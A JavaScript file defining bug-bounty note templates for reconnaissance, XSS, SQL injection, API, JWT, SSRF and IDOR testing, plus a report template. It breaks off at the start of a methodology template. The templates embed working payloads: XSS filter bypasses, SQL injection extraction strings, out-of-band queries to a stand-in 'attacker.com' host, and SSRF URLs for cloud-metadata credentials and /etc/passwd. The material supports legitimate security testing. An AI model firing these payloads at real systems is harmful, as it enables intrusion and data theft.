// Template categories
const templateCategories = {
    'general': 'General',
    'vulnerability': 'Vulnerability Types',
    'recon': 'Reconnaissance',
    'reporting': 'Reporting',
    'other': 'Other'
  };
  
  // Default templates for bug bounty hunting
  const defaultTemplates = [
    {
      id: 'template-recon',
      name: 'Comprehensive Reconnaissance',
      category: 'recon',
      content: `# Comprehensive Reconnaissance Checklist
  
  ## Target Information
  - **Company Name**: 
  - **Target Domain**: 
  - **Scope**: 
  - **Out of Scope**: 
  - **Start Date**: 
  - **Researcher**: 
  
  ## Subdomain Enumeration
  - [ ] Passive Sources
    - [ ] Certificate Transparency logs (crt.sh)
    - [ ] SecurityTrails
    - [ ] RapidDNS
    - [ ] DNSDumpster
    - [ ] Shodan
    - [ ] Censys
    - [ ] VirusTotal
    - [ ] JLDC
    - [ ] UrlScan.io
    - [ ] Github Code
  
  - [ ] Active Enumeration Tools
    - [ ] Sublist3r
    - [ ] Amass (passive & active modes)
    - [ ] Subfinder
    - [ ] Assetfinder
    - [ ] Findomain
    - [ ] GoBuster DNS
    - [ ] AltDNS for permutations
  
  ## DNS Analysis
  - [ ] Zone transfers
  - [ ] DNS records (A, AAAA, CNAME, MX, TXT, NS)
  - [ ] Wildcard DNS detection
  - [ ] Virtual hosts discovery
  - [ ] Internal IP leakage
  - [ ] SPF/DMARC/DKIM configuration
  
  ## Port Scanning & Service Enumeration
  - [ ] Quick Nmap scan \`nmap -sS -sV -p 80,443,8080,8443 <target>\`
  - [ ] Full TCP scan \`nmap -sS -sV -p- --min-rate 1000 <target>\`
  - [ ] UDP scan for critical services \`nmap -sU -p 53,161,123,500 <target>\`
  - [ ] Vulnerable service identification
  - [ ] SSL/TLS scanning with sslscan/testssl.sh
  - [ ] Banner grabbing
  
  ## Web Technology Fingerprinting
  - [ ] Wappalyzer
  - [ ] BuiltWith
  - [ ] Whatweb
  - [ ] HTTP headers analysis
  - [ ] Cookies analysis
  - [ ] JavaScript frameworks detection
  - [ ] CMS detection and version
  
  ## Content Discovery
  - [ ] Robots.txt/sitemap.xml analysis
  - [ ] Favicon hash check
  - [ ] Directory enumeration
    - [ ] Gobuster
    - [ ] Dirsearch
    - [ ] Feroxbuster
  - [ ] JS file analysis (JSParser/LinkFinder)
  - [ ] Web archive discovery (Wayback Machine)
  - [ ] Google dorking
  - [ ] GitHub recon (GitHound, Gitrob)
  - [ ] S3 bucket discovery
  - [ ] Hidden parameters discovery (Arjun/ParamSpider)
  - [ ] Broken link analysis
  - [ ] Default credentials check
  
  ## Additional Enumeration
  - [ ] Email harvesting
  - [ ] Employee/user information
  - [ ] API endpoints discovery
  - [ ] Mobile app analysis
  - [ ] Social media reconnaissance
  - [ ] Document metadata analysis
  - [ ] Network infrastructure mapping
  - [ ] Cloud resources (S3, Azure, GCP)
  
  ## Vulnerability Scanning
  - [ ] Automated scanners (Nuclei, Nikto)
  - [ ] CORS misconfiguration
  - [ ] HTTP security headers
  - [ ] WAF detection and fingerprinting
  - [ ] Rate limiting tests
  - [ ] CMS-specific scanners
  
  ## Notes & Observations
  *Document your findings here*
  
  ## Interesting Endpoints
  | URL | Description | Potential Vulnerabilities |
  | --- | --- | --- |
  |  |  |  |
  
  ## Next Steps
  *List your prioritized testing targets*`
    },
    {
      id: 'template-xss',
      name: 'Cross-Site Scripting (XSS)',
      category: 'vulnerability',
      content: `# Cross-Site Scripting (XSS) Testing
  
  ## Target Information
  - **URL/Endpoint**: 
  - **Parameters Tested**: 
  - **Context**: [HTML Body / HTML Attribute / JavaScript / CSS]
  - **Browser**: 
  - **WAF/Protections**: 
  
  ## Vulnerability Description
  Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users, bypassing the Same Origin Policy.
  
  ## Testing Methodology
  
  ### 1. Identify Injection Points
  - [ ] URL parameters
  - [ ] Form fields
  - [ ] HTTP headers (Referer, User-Agent)
  - [ ] JSON/XML body parameters
  - [ ] File upload names/metadata
  - [ ] Import/Export features
  - [ ] HTML5 storage
  - [ ] WebSocket data
  
  ### 2. Context Analysis
  - [ ] HTML Body context
  - [ ] HTML Attribute context
  - [ ] JavaScript context
  - [ ] CSS context
  - [ ] URL context
  - [ ] Determined encoding/filtering
  
  ### 3. Basic Payload Testing
  
  \`\`\`
  <!-- Basic Detection -->
  '';!--"<XSS>=&{()}
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  
  <!-- HTML Context -->
  <img src=x onerror=alert(document.domain)>
  <iframe onload=alert(1)>
  <body onload=alert(1)>
  
  <!-- Event Handlers -->
  <div onmouseover=alert(1)>hover me</div>
  <button onclick=alert(1)>click me</button>
  <input type=text onfocus=alert(1) autofocus>
  \`\`\`
  
  ### 4. WAF Bypass Techniques
  
  \`\`\`
  <!-- Character Encoding -->
  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
  <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
  
  <!-- JS Encoding -->
  <script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>
  
  <!-- Mixed Case Obfuscation -->
  <ScRiPt>alert(1)</ScRiPt>
  <iMg sRc=x OnErRoR=alert(1)>
  
  <!-- Tag Breaking -->
  <svg/onload=alert(1)>
  <img/src="x"/onerror=alert(1)>
  
  <!-- No Quotes/Semicolons -->
  <img src=x onerror=alert(document.domain)>
  \`\`\`
  
  ### 5. Context-Specific Payloads
  
  #### HTML Attribute Context:
  \`\`\`
  " onmouseover="alert(1)
  " autofocus onfocus="alert(1)
  "><script>alert(1)</script>
  \`\`\`
  
  #### JavaScript Context:
  \`\`\`
  ';alert(1);//
  \`;alert(1);//
  </script><script>alert(1)</script>
  \`\`\`
  
  #### CSS Context:
  \`\`\`
  </style><script>alert(1)</script>
  </style><img src=x onerror=alert(1)>
  \`\`\`
  
  ## Results
  - [ ] Reflected XSS found
  - [ ] Stored XSS found
  - [ ] DOM-based XSS found
  - [ ] Self-XSS found
  - [ ] mXSS (Mutation-based XSS) found
  
  ## Exploitation Details
  *Document exact steps to reproduce*
  
  \`\`\`
  // Add your working proof of concept code here
  \`\`\`
  
  ## Impact Analysis
  - [ ] Account takeover
  - [ ] Data theft (cookies, tokens)
  - [ ] Phishing
  - [ ] Malware distribution
  - [ ] Defacement
  - [ ] Network scanning
  
  ## Bypass Methods Used
  *Document any WAF/filter bypass techniques that worked*
  
  ## Recommended Fixes
  1. Context-appropriate output encoding
  2. Content Security Policy implementation
  3. Use of framework's built-in XSS protections
  4. Input validation and sanitization
  
  ## References
  - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
  - [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
  - [XSS Hunter](https://xsshunter.com/)`
    },
    {
      id: 'template-sqli',
      name: 'SQL Injection Testing',
      category: 'vulnerability',
      content: `# SQL Injection Testing
  
  ## Target Information
  - **URL/Endpoint**: 
  - **Parameters Tested**: 
  - **HTTP Method**: [GET/POST/PUT]
  - **Database Type**: [MySQL/MSSQL/PostgreSQL/Oracle/SQLite]
  - **Authentication Required**: [Yes/No]
  
  ## Vulnerability Description
  SQL Injection occurs when user-supplied data is included in an SQL query without proper validation or sanitization, allowing attackers to manipulate the query structure.
  
  ## Testing Methodology
  
  ### 1. Identification Phase
  
  #### Basic Detection Payloads
  \`\`\`
  '
  "
  \\'
  \\\\
  ;
  -- -
  )
  '))
  ORDER BY 1
  \`\`\`
  
  #### Logic Testing
  \`\`\`
  AND 1=1
  AND 1=2
  OR 1=1
  OR 1=2
  1' AND '1'='1
  1' AND '1'='2
  \`\`\`
  
  ### 2. DBMS Fingerprinting
  
  #### Error-based Fingerprinting
  \`\`\`
  MySQL: AND extractvalue(rand(),concat(0x3a,version()))
  MSSQL: AND 1=convert(int,(SELECT @@version))
  Oracle: AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))
  PostgreSQL: AND 1=cast(version() as numeric)
  \`\`\`
  
  #### Time-based Fingerprinting
  \`\`\`
  MySQL: AND SLEEP(5)
  MSSQL: WAITFOR DELAY '0:0:5'
  Oracle: AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=0
  PostgreSQL: AND pg_sleep(5)
  \`\`\`
  
  ### 3. Exploitation Techniques
  
  #### Union-based Exploitation
  \`\`\`
  ' UNION SELECT NULL-- -
  ' UNION SELECT NULL,NULL-- -
  (Continue adding NULLs until column count matches)
  
  ' UNION SELECT 1,2,3,4,...-- -
  (To identify which columns are displayed)
  
  ' UNION SELECT table_name,2 FROM information_schema.tables-- -
  ' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
  ' UNION SELECT username,password FROM users-- -
  \`\`\`
  
  #### Blind Exploitation (Boolean)
  \`\`\`
  ' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -
  ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>90-- -
  ' AND (SELECT COUNT(*) FROM users)>5-- -
  \`\`\`
  
  #### Blind Exploitation (Time-based)
  \`\`\`
  ' AND IF(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a',SLEEP(5),0)-- -
  ' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),0)-- -
  \`\`\`
  
  #### Out-of-Band Exploitation
  \`\`\`
  MySQL: 
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\share\\\\a.txt'))-- -
  
  MSSQL:
  '; EXEC master..xp_dirtree '\\\\attacker.com\\share\\';-- -
  \`\`\`
  
  ### 4. Advanced Techniques
  
  #### Filter Bypasses
  \`\`\`
  Case Variation: SeLeCt
  Comments: /**/ instead of space
  Alternative Operators: || instead of OR
  Hex Encoding: 0x53454c454354 (for "SELECT")
  URL Encoding
  Character Concatenation: CHAR(83)+CHAR(69)+... for "SELECT"
  \`\`\`
  
  #### Second-Order Injection
  *Document steps to trigger stored injection that executes in another context*
  
  ## Results
  - [ ] Error-based SQLi found
  - [ ] Time-based blind SQLi found
  - [ ] Boolean-based blind SQLi found
  - [ ] Union-based SQLi found
  - [ ] Out-of-band SQLi found
  - [ ] Second-order SQLi found
  
  ## Exploitation Proof of Concept
  \`\`\`
  // Add your working proof of concept code here
  // Include exact request/response details
  \`\`\`
  
  ## Data Retrieved
  *Document any data successfully extracted (redact sensitive information)*
  
  ## Impact Analysis
  - [ ] Full database read access
  - [ ] Partial database read access
  - [ ] Database write access
  - [ ] File system access
  - [ ] Command execution
  - [ ] Authentication bypass
  
  ## Recommended Fixes
  1. Use prepared statements/parameterized queries
  2. Apply input validation and sanitization
  3. Implement least privilege database accounts
  4. Enable proper error handling
  5. Consider using an ORM framework
  6. Implement WAF rules specific to SQLi
  
  ## References
  - [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
  - [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
  - [PayloadsAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)`
    },
    {
      id: 'template-api',
      name: 'API Security Testing',
      category: 'vulnerability',
      content: `# API Security Testing
  
  ## Target Information
  - **API Name/Version**: 
  - **Base URL**: 
  - **Authentication Type**: [None/API Key/OAuth/JWT/Basic Auth]
  - **Documentation**: [Available/Partial/None]
  - **Data Format**: [JSON/XML/GraphQL]
  
  ## Testing Environment
  - **Tools Used**: [Burp Suite/Postman/OWASP ZAP/Custom Scripts]
  - **Collection Method**: [Swagger Import/Manual Mapping/Traffic Analysis]
  
  ## API Endpoints Inventory
  | Method | Endpoint | Auth Required | Purpose/Function | Parameters |
  |--------|----------|---------------|------------------|------------|
  | GET    | /api/v1/users | Yes | Retrieve users | limit, offset |
  |        |          |               |                  |            |
  |        |          |               |                  |            |
  
  ## Authentication Testing
  - [ ] Missing authentication
  - [ ] JWT testing
    - [ ] Algorithm confusion
    - [ ] Weak signature
    - [ ] Missing claims validation
    - [ ] Token replay
    - [ ] Missing expiration
  - [ ] OAuth testing
    - [ ] Redirect URI validation
    - [ ] State parameter
    - [ ] PKCE implementation
  - [ ] API key exposure
    - [ ] Logs/errors
    - [ ] Client-side code
    - [ ] Git repositories
  - [ ] Basic auth over HTTP
  - [ ] Brute force protection
  
  ## Authorization Testing
  - [ ] Broken object-level authorization (BOLA/IDOR)
    - [ ] Direct reference to objects by ID
    - [ ] Path/parameter manipulation
    - [ ] HTTP method manipulation
  - [ ] Broken function-level authorization
    - [ ] Admin functions accessible to regular users
    - [ ] Unauthorized HTTP methods (POST instead of GET)
  - [ ] Mass assignment vulnerabilities
  - [ ] Excessive data exposure (overly verbose responses)
  - [ ] Rate limiting/resource exhaustion testing
  
  ## Input Validation Testing
  - [ ] Injection testing
    - [ ] SQL injection
    - [ ] NoSQL injection
    - [ ] Command injection
    - [ ] GraphQL injection
    - [ ] XML injection/XXE
  - [ ] Schema validation issues
  - [ ] Type confusion/casting
  - [ ] Parameter pollution
  
  ## Business Logic Testing
  - [ ] Race conditions
  - [ ] Transaction flows
  - [ ] Logical constraints
  - [ ] Numeric limitations
  - [ ] Status/state transitions
  - [ ] Data integrity rules
  
  ## API Specific Testing
  - [ ] GraphQL
    - [ ] Introspection enabled
    - [ ] Field suggestions
    - [ ] Batching attacks
    - [ ] Recursive queries
  - [ ] REST
    - [ ] Improper HTTP verbs
    - [ ] CORS misconfiguration
  - [ ] SOAP
    - [ ] XML external entities
    - [ ] WSDL scanning
  
  ## Infrastructure Testing
  - [ ] Improper assets management (dev/staging endpoints)
  - [ ] Lack of TLS
  - [ ] Weak TLS configuration
  - [ ] Information exposure in HTTP headers
  - [ ] Verbose error messages
  - [ ] CORS misconfigurations
  - [ ] Security headers missing
  - [ ] Unpatched API frameworks/libraries
  
  ## Vulnerabilities Found
  *Document each vulnerability with:*
  1. **Title**: 
  2. **Endpoint**: 
  3. **Description**: 
  4. **Reproduction Steps**: 
  5. **Impact**: 
  6. **Remediation**: 
  
  ## Tools & Techniques
  *Document specific tools or techniques that were useful*
  
  ## References
  - [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
  - [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
  - [API Penetration Testing](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)`
    },
    {
      id: 'template-jwt',
      name: 'JWT Security Testing',
      category: 'vulnerability',
      content: `# JWT (JSON Web Token) Security Testing
  
  ## Target Information
  - **Application**: 
  - **JWT Implementation**: [Auth0/Custom/Other]
  - **JWT Location**: [Authorization Header/Cookie/Local Storage]
  - **JWT Use**: [Authentication/Authorization/Session Management]
  
  ## Token Structure Analysis
  *Paste a sample token (with sensitive data removed)*
  
  ### Header Analysis
  \`\`\`json
  {
    "alg": "",
    "typ": "",
    "kid": ""
  }
  \`\`\`
  
  ### Payload Analysis
  \`\`\`json
  {
    "sub": "",
    "name": "",
    "role": "",
    "iat": 0,
    "exp": 0
  }
  \`\`\`
  
  ### Signature Algorithm: [HS256/RS256/ES256/None]
  
  ## Vulnerability Testing Checklist
  
  ### 1. Algorithm Verification
  - [ ] "none" algorithm acceptance
    - Payload: \`{"alg":"none","typ":"JWT"}.\{payload}.\`
  - [ ] Algorithm confusion/switching attack
    - HS256 to RS256 confusion
    - Payload: modify header \`"alg": "HS256"\` to \`"alg": "RS256"\`
  - [ ] Weak HMAC keys for HS256
    - Dictionary attack against signature
    - Common/default secrets testing
  
  ### 2. Signature Validation
  - [ ] Missing signature validation
  - [ ] Signature stripping attack
  - [ ] Signature bruteforcing
  - [ ] Key disclosure through:
    - [ ] JWKS endpoint misconfigurations
    - [ ] Public source code repositories
    - [ ] Directory traversal to private key
    - [ ] Weak key generation
  
  ### 3. Claim Validation Issues
  - [ ] Missing "exp" (expiration) validation
  - [ ] Missing "nbf" (not before) validation
  - [ ] Token replay vulnerability
    - [ ] Missing/reused jti (JWT ID)
  - [ ] Missing audience validation ("aud" claim)
  - [ ] Missing issuer validation ("iss" claim)
  
  ### 4. Injection Attacks
  - [ ] SQL injection via JWT claims
  - [ ] Command injection via JWT claims
  - [ ] XSS via unescaped claims displayed in UI
  
  ### 5. Information Disclosure
  - [ ] Sensitive data in token payload
  - [ ] Excessive permissions/scopes
  - [ ] Role information disclosure
  - [ ] Internal endpoints/systems disclosed
  
  ### 6. Implementation Flaws
  - [ ] Weak token generation entropy
  - [ ] JWT library vulnerabilities
  - [ ] Missing key rotation
  - [ ] Client-side validation only
  - [ ] Race conditions
  
  ## Successful Attacks
  
  ### Attack 1: [Name of attack]
  - **Description**:
  - **Tool(s) Used**:
  - **Reproduction Steps**:
    1. 
    2. 
    3. 
  - **Impact**:
  
  ## Testing Tools Used
  - [ ] JWT.io
  - [ ] Burp Suite JWT extension
  - [ ] JWT_Tool
  - [ ] jwtcrack
  - [ ] Custom scripts
  
  ## Recommendations
  1. Use strong algorithms (RS256/ES256 over HS256)
  2. Implement proper signature validation
  3. Validate all relevant claims (exp, nbf, aud, iss)
  4. Use short expiration times + server-side blacklisting
  5. Implement key rotation procedures
  6. Keep JWT libraries updated
  7. Don't store sensitive data in JWT payload
  8. Implement JWKS endpoint securely
  
  ## References
  - [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
  - [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
  - [Auth0 JWT Best Practices](https://auth0.com/docs/secure/tokens/json-web-tokens)`
    },
    {
      id: 'template-ssrf',
      name: 'SSRF Testing',
      category: 'vulnerability',
      content: `# Server-Side Request Forgery (SSRF) Testing
  
  ## Target Information
  - **Application**: 
  - **Potentially Vulnerable Endpoints**: 
  - **Authentication Required**: [Yes/No]
  
  ## Vulnerability Description
  Server-Side Request Forgery (SSRF) occurs when an attacker can make the server perform requests to arbitrary destinations, potentially accessing internal services or exfiltrating data.
  
  ## Testing Methodology
  
  ### 1. Identify Potential SSRF Vectors
  - [ ] URL input fields (fetch URL, webhooks, integrations)
  - [ ] File uploads that process remote URLs
  - [ ] API endpoints that fetch remote content
  - [ ] PDF generators
  - [ ] Image processors
  - [ ] Import/Export functionality
  - [ ] Document/link preview features
  - [ ] Feedback forms with link fields
  - [ ] WebSockets
  
  ### 2. Basic Testing for URL Processing
  
  **Test payloads:**
  \`\`\`
  http://127.0.0.1
  http://localhost
  http://0.0.0.0
  http://0177.0.0.1 (IP octal encoding)
  http://2130706433 (Decimal IP)
  http://0x7f.0x0.0x0.0x1 (Hex encoding)
  http://[::1] (IPv6)
  http://127.0.0.1:22
  http://127.0.0.1:3306
  http://127.0.0.1:6379
  \`\`\`
  
  ### 3. Internal Network Scanning
  
  **Common internal endpoints:**
  \`\`\`
  http://127.0.0.1:80
  http://127.0.0.1:443
  http://127.0.0.1:8080
  http://127.0.0.1:8443
  http://127.0.0.1:8000
  http://127.0.0.1:8008
  http://127.0.0.1:3000
  http://127.0.0.1:3001
  http://localhost:9200 (Elasticsearch)
  http://localhost:8500 (Consul)
  http://localhost:15672 (RabbitMQ)
  http://localhost:25 (SMTP)
  http://localhost:5984 (CouchDB)
  http://localhost:5000 (Docker Registry)
  http://localhost:2375 (Docker)
  http://localhost:22 (SSH)
  http://10.0.0.1
  http://172.16.0.1
  http://192.168.1.1
  \`\`\`
  
  ### 4. Cloud Metadata Endpoints
  
  **AWS:**
  \`\`\`
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/user-data
  http://169.254.169.254/latest/dynamic/instance-identity/document
  \`\`\`
  
  **Google Cloud:**
  \`\`\`
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
  \`\`\`
  
  **Azure:**
  \`\`\`
  http://169.254.169.254/metadata/instance
  http://169.254.169.254/metadata/instance/network
  \`\`\`
  
  ### 5. Blind SSRF Testing
  - [ ] Out-of-band interaction (Burp Collaborator, Interactsh)
  - [ ] Time-based testing (delays in response)
  
  ### 6. Protocol Testing
  - [ ] file:///etc/passwd
  - [ ] file:///proc/self/environ
  - [ ] file:///var/log/apache2/access.log
  - [ ] gopher://127.0.0.1:6379/_set%20ssrf%20test
  - [ ] dict://127.0.0.1:11211/stats
  - [ ] ftp://127.0.0.1:21
  - [ ] ldap://127.0.0.1:389
  
  ### 7. Filter Bypass Techniques
  - [ ] URL encoding
  - [ ] Double URL encoding
  - [ ] Using different IP formats (decimal, octal, hex)
  - [ ] IPv6 address representation
  - [ ] Domain redirection
  - [ ] Using shorteners (bit.ly, tinyurl)
  - [ ] DNS rebinding
  - [ ] Open redirects chaining
  
  ## Results
  
  ### Vulnerable Endpoints
  | Endpoint | Parameter | Payload Used | Result |
  |----------|-----------|--------------|--------|
  |          |           |              |        |
  
  ### Bypass Techniques That Worked
  *Document successful bypass methods*
  
  ### Internal Services Discovered
  *Document internal services that were accessed*
  
  ### Data Extracted
  *Document any data that was successfully extracted (redact sensitive info)*
  
  ## Impact Analysis
  - [ ] Access to internal services
  - [ ] Data exfiltration
  - [ ] Remote code execution
  - [ ] Lateral movement
  - [ ] Sensitive information disclosure
  - [ ] Internal port scanning
  - [ ] Denial of service
  
  ## Exploitation Proof of Concept
  \`\`\`
  // Add your working proof of concept code/requests here
  \`\`\`
  
  ## Recommended Fixes
  1. Implement allowlisting of domains/IPs
  2. Disable unused URL schemas/protocols
  3. Use an intermediary service for URL fetching
  4. Implement proper access controls on internal services
  5. Deploy a dedicated egress filtering proxy
  6. Use network segmentation for sensitive services
  7. Validate and sanitize user input
  8. Rate-limit SSRF-prone functionality
  
  ## References
  - [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
  - [PortSwigger SSRF Guide](https://portswigger.net/web-security/ssrf)
  - [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)`
    },
    {
      id: 'template-idor',
      name: 'IDOR Testing',
      category: 'vulnerability',
      content: `# Insecure Direct Object Reference (IDOR) Testing
  
  ## Target Information
  - **Application**: 
  - **Vulnerable Endpoints**: 
  - **Authentication**: [Admin/User/None]
  - **Objects Tested**: [Users/Orders/Documents/Posts/Comments]
  
  ## Vulnerability Description
  Insecure Direct Object References (IDOR) occur when an application exposes a reference to an internal implementation object, allowing attackers to manipulate these references and access unauthorized data.
  
  ## Testing Methodology
  
  ### 1. Identify Object References
  - [ ] Sequential IDs (1, 2, 3...)
  - [ ] GUIDs/UUIDs
  - [ ] Predictable references
  - [ ] Hashed values
  - [ ] Base64 encoded values
  - [ ] Custom encoding schemes
  - [ ] JSON Web Tokens (JWT)
  
  ### 2. Horizontal Access Testing
  *Accessing resources belonging to other users of the same privilege level*
  
  - **Test Cases:**
    - [ ] Create two test accounts
    - [ ] Perform actions with both accounts to generate data
    - [ ] Capture requests containing object references
    - [ ] Swap identifiers between accounts
    - [ ] Test CRUD operations (Create, Read, Update, Delete)
  
  ### 3. Vertical Access Testing
  *Accessing resources requiring higher privileges*
  
  - **Test Cases:**
    - [ ] Regular user accessing admin functions
    - [ ] Anonymous user accessing authenticated user functions
    - [ ] Standard user accessing premium features
  
  ### 4. Common Vulnerable Endpoints
  
  | Function Type | Typical Endpoint | HTTP Method | Parameters |
  |---------------|------------------|-------------|------------|
  | User profile | /api/users/{id} | GET/PUT | id, user_id |
  | Account details | /api/account/{id} | GET | account_id |
  | Order history | /api/orders/{id} | GET | order_id |
  | Documents | /documents/{id} | GET | doc_id |
  | Messages | /messages/{id} | GET | message_id |
  | API resources | /api/v1/{resource}/{id} | GET/PUT/DELETE | id |
  
  ### 5. Parameter Manipulation Techniques
  - [ ] Change numeric IDs (increment/decrement)
  - [ ] Modify UUIDs/GUIDs
  - [ ] Decode and tamper with encoded parameters
  - [ ] Test different HTTP methods (GET, POST, PUT, DELETE)
  - [ ] Batch operations/mass assignment
  - [ ] Race conditions
  - [ ] Parameter pollution
  
  ### 6. Bypass Techniques
  - [ ] HTTP request method switching
  - [ ] Use JSON instead of form data
  - [ ] Add parameters (X-Original-User, X-Forwarded-For)
  - [ ] Remove validation tokens
  - [ ] Modify content-type header
  - [ ] JSON padding/wrapping
  - [ ] XML external entity (XXE) 
  - [ ] Try different API versions
  
  ## Results
  
  ### Vulnerable Endpoints
  | Endpoint | HTTP Method | Parameter | Attack Technique | Result |
  |----------|-------------|-----------|------------------|--------|
  |          |             |           |                  |        |
  
  ### Access Control Matrix
  Document which roles can access which resources, and where the vulnerabilities exist
  
  | Resource | Admin | User | Anonymous | Notes |
  |----------|-------|------|-----------|-------|
  |          |       |      |           |       |
  
  ## Impact Analysis
  - [ ] Unauthorized data access
  - [ ] Account takeover
  - [ ] Information disclosure
  - [ ] Data modification
  - [ ] Business logic abuse
  - [ ] Privacy violations
  - [ ] Regulatory compliance issues
  
  ## Exploitation Proof of Concept
  \`\`\`
  // Add detailed reproduction steps here
  \`\`\`
  
  ## Tools Used
  - [ ] Burp Suite (Authorize extension)
  - [ ] OWASP ZAP
  - [ ] Postman
  - [ ] Custom scripts
  
  ## Recommended Fixes
  1. Implement proper authorization checks on server-side
  2. Use indirect reference maps
  3. Verify user ownership of resources before access
  4. Implement contextual access controls
  5. Use UUID instead of sequential IDs
  6. Apply rate limiting
  7. Add proper logging and monitoring
  
  ## References
  - [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
  - [PortSwigger IDOR Guide](https://portswigger.net/web-security/access-control/idor)
  - [HackerOne IDOR Reports](https://www.hackerone.com/knowledge-center/insecure-direct-object-reference-web-security-vulnerability)`
    },
    {
      id: 'template-report',
      name: 'Professional Vulnerability Report',
      category: 'reporting',
      content: `# Security Vulnerability Report
  
  ## Executive Summary
  *Brief 2-3 sentence description of the vulnerability and its potential impact*
  
  ## Vulnerability Details
  
  **Vulnerability Type**: [SQL Injection, XSS, CSRF, etc.]
  **Severity**: [Critical/High/Medium/Low/Informational]
  **CVSS Score**: [0.0-10.0] | [Vector String](https://www.first.org/cvss/calculator/3.1)
  **CWE Classification**: [CWE-XXX](https://cwe.mitre.org/data/definitions/XXX.html)
  **Bug Bounty Program**: [Program Name]
  **Reported By**: [Your Name/Handle]
  **Report Date**: [YYYY-MM-DD]
  
  ## Technical Description
  *Detailed technical explanation of the vulnerability, including affected components*
  
  ### Affected Component
  - **URL**: [https://example.com/vulnerable/endpoint]
  - **Parameter/Input**: [\`parameter_name\`]
  - **Affected Version**: [Version X.Y.Z]
  - **Affected Environment**: [Production/Staging/Development]
  - **Affected Users/Tenants**: [All/Specific Group]
  
  ## Reproduction Steps
  1. Log in to the application using [credentials/steps]
  2. Navigate to [specific functionality]
  3. Intercept the request using a proxy tool
  4. Modify the [\`parameter_name\`] parameter to [\`payload\`]
  5. Observe that [expected vulnerable behavior]
  
  ## Proof of Concept
  
  ### Request
  \`\`\`http
  POST /api/v1/users HTTP/1.1
  Host: example.com
  Content-Type: application/json
  Authorization: Bearer eyJ0eXAi...
  
  {
    "parameter": "malicious_value"
  }
  \`\`\`
  
  ### Response
  \`\`\`http
  HTTP/1.1 200 OK
  Content-Type: application/json
  
  {
    "sensitive_data": "exposed information"
  }
  \`\`\`
  
  ## Impact Assessment
  
  ### Direct Impact
  *What an attacker can immediately achieve by exploiting this vulnerability*
  
  ### Secondary Impact
  *Potential follow-up attacks or escalation paths*
  
  ### Business Impact
  *How this affects the business (data breach costs, compliance violations, reputation damage)*
  
  ## Severity Justification
  *Explain why you've assigned this severity level, referencing:*
  - Exploitability factors
  - Technical impact
  - Business context
  - Affected user base
  - Data sensitivity
  
  ## Mitigation Recommendations
  
  ### Short-term Fix
  *Immediate actions to mitigate the vulnerability*
  
  ### Long-term Solution
  *Comprehensive fix addressing the root cause*
  
  ### Code Example (If Applicable)
  \`\`\`
  // Vulnerable code
  $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
  
  // Fixed code
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->execute([$_GET['id']]);
  \`\`\`
  
  ## Attack Scenario
  *A realistic scenario showing how an attacker might exploit this in the wild*
  
  ## Additional Information
  - **Discovered During**: [Pentest/Bug Bounty/Security Research]
  - **Tools Used**: [Burp Suite/OWASP ZAP/Custom Scripts]
  - **Time to Exploit**: [Immediate/Requires Preparation/Complex]
  - **Authentication Required**: [Yes/No]
  - **User Interaction Required**: [Yes/No]
  
  ## References
  - [OWASP Top 10 reference](https://owasp.org/Top10/)
  - [Related CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXXX)
  - [Technical blog post/paper]
  - [Similar vulnerabilities in other systems]
  
  ## Disclosure Timeline
  - **[YYYY-MM-DD]**: Vulnerability discovered
  - **[YYYY-MM-DD]**: Initial report submitted
  - **[YYYY-MM-DD]**: Vendor acknowledgment
  - **[YYYY-MM-DD]**: Vendor patched
  - **[YYYY-MM-DD]**: Public disclosure
  
  ---
  
  *This report is provided for security purposes only. The reporter makes no warranties about the quality or security of this application.*`
    },
    {
      id: 'template-methodology',
      name: 'Web App Testing Methodology',
      category: 'general',
      content: `# Web Application Security Testing Methodology
  
  ## Project Information
  - **Target**: [Application Name/URL]
  - **Scope**: [In-scope endpoints, features, etc.]
  - **Testing Period**: [YYYY-MM-DD] to [YYYY-MM-DD]
